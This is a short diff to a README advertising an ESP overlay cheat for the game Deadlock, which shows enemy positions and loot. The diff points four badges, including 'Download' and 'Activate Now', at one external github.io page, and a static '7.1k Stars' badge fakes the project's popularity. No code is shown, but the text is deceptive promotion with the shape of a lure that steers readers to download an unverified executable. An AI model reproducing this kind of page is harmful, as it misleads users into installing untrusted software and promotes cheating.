@@ -2,10 +2,10 @@
 
 The **Deadlock ESP Overlay Software** gives players total situational awareness by displaying **enemy positions, loot, allies, and objectives** directly on screen. With customizable visuals and hotkey toggles, it helps you **plan strategies, avoid ambushes, and practice tactical control** in training and private sessions.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 7.1k Stars](https://img.shields.io/badge/⭐️%207.1k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](https://deadlock-esp-overlay.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://deadlock-esp-overlay.github.io/.github/)
+[![⭐️ 7.1k Stars](https://img.shields.io/badge/⭐️%207.1k-Stars-yellow?style=for-the-badge\&logo=github)](https://deadlock-esp-overlay.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://deadlock-esp-overlay.github.io/.github/)
 
 ---
 
